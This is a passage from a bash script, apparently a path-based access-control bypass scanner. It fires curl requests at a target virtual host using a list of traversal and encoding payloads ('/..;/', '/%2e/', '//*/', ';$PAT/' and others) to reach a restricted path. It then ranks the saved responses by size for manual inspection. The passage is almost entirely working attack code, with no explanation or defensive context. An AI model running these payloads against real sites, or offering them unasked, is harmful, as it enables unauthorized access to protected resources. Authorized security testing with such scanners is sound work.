code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT%20/$PAT" -H "$user_agent")
print
echo -n "Payload [ .json ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.json$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.json$PAT" -H "$user_agent")
print
echo -n "Payload [ \..\.\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/\..\.\\$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/\..\.\\$PAT" -H "$user_agent")
print
echo -n "Payload [ /* ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*$PAT" -H "$user_agent")
print
echo -n "Payload [ ./. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/./.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/./.$PAT" -H "$user_agent")
print
echo -n "Payload [ /*/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [%2e/$PAT ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ //. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.$PAT" -H "$user_agent")
print
echo -n "Payload [ //// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/////$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/////$PAT" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;$PAT/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;$PAT/$PAT" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;$PAT/$PAT" -H "$user_agent")
print

echo -e ${green}"All done, scan results in $PWD"${end}
echo -e ${green}"Now displaying unique results, inspect them manually (cat, bat, ...)"${end}
wc "$PWD"/*  | grep --color=never -F 'original.html'
wc "$PWD"/*  | grep -vF total | awk -F/ '!_[$1]++' | sort -n
